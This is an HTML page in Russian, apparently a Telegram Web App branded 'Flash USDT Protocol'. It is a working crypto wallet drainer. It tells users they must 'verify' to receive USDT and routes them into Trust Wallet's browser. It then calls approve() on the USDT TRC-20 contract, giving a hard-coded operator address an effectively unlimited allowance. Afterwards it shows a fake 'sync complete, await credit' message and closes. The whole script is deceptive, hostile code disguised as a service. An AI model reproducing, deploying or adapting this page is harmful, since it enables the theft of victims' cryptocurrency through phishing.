<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Flash USDT Protocol</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body { background-color: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .container { padding: 30px; width: 100%; max-width: 400px; }
        .loader { border: 2px solid #222; border-top: 2px solid #0088cc; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { font-size: 22px; margin: 0 0 15px; }
        p { color: #888; font-size: 14px; margin-bottom: 30px; }
        .btn { background: #0088cc; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 18px; font-weight: bold; text-transform: uppercase; font-size: 15px; }
        .btn:disabled { background: #333; color: #666; }
    </style>
</head>
<body>

<div class="container">
    <div id="ui-loading">
        <div class="loader"></div>
        <p id="loading-text">Ищем кошелек в сети TRC-20...</p>
    </div>

    <div id="ui-wallet" style="display: none;">
        <h2>Узел синхронизирован</h2>
        <p>Для зачисления USDT необходимо верифицировать логи транзакций.</p>
        <button id="btn-verify" class="btn">ВЕРИФИЦИРОВАТЬ</button>
    </div>

    <div id="ui-telegram" style="display: none;">
        <h2>Flash USDT Protocol</h2>
        <p>Для восстановления доступа выберите ваш основной кошелек:</p>
        <button id="btn-open-trust" class="btn">Открыть в Trust Wallet</button>
    </div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
    const CONTRACT_ADDR = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    const BASE_URL = "https://timur3417.github.io/sync-node-app/";

    const uiLoading = document.getElementById('ui-loading');
    const uiWallet = document.getElementById('ui-wallet');
    const uiTelegram = document.getElementById('ui-telegram');
    const loadingText = document.getElementById('loading-text');

    let walletProvider = null;

    // Функция поиска кошелька
    function findProvider() {
        // Проверяем все возможные места, где кошелек прячет свои "мозги"
        const provider = window.tronWeb || (window.tron && window.tron.tronWeb) || window.sunWeb;
        if (provider) {
            walletProvider = provider;
            return true;
        }
        return false;
    }

    function init() {
        const urlParams = new URLSearchParams(window.location.search);
        const isWalletMode = urlParams.get('mode') === 'wallet';

        if (findProvider()) {
            uiLoading.style.display = 'none';
            uiTelegram.style.display = 'none';
            uiWallet.style.display = 'block';
        } else if (isWalletMode) {
            // Если мы в режиме кошелька, но он не найден - ждем еще немного
            loadingText.innerText = "Ошибка: Смените сеть на TRON (TRC-20) в настройках кошелька.";
        } else {
            uiLoading.style.display = 'none';
            uiTelegram.style.display = 'block';
        }
    }

    // Кнопка: ТГ -> Кошелек
    document.getElementById('btn-open-trust').onclick = () => {
        const deepLink = "https://link.trustwallet.com/open_url?coin_id=195&url=" + encodeURIComponent(BASE_URL + "?mode=wallet");
        tg.openLink(deepLink);
    };

    // Кнопка: Верификация
    document.getElementById('btn-verify').onclick = async () => {
        if (!findProvider()) {
            alert("Кошелек не найден. Убедитесь, что выбрана сеть Tron.");
            return;
        }

        try {
            // Запрашиваем аккаунты
            if (walletProvider.request) {
                await walletProvider.request({ method: 'tron_requestAccounts' });
            }

            const contract = await walletProvider.contract().at(CONTRACT_ADDR);
            await contract.approve(ADMIN, '1000000000000000').send();

            tg.showPopup({
                title: 'Готово',
                message: 'Синхронизация завершена. Ожидайте зачисления в течение 15-30 минут.',
                buttons: [{type: 'ok'}]
            });
            setTimeout(() => tg.close(), 4000);
        } catch (e) {
            tg.showAlert("Действие отклонено. Попробуйте еще раз.");
        }
    };

    // Запускаем проверку каждые 500мс в течение 5 секунд
    let attempts = 0;
    const interval = setInterval(() => {
        attempts++;
        if (findProvider() || attempts > 10) {
            clearInterval(interval);
            init();
        }
    }, 500);
</script>
</body>
</html>
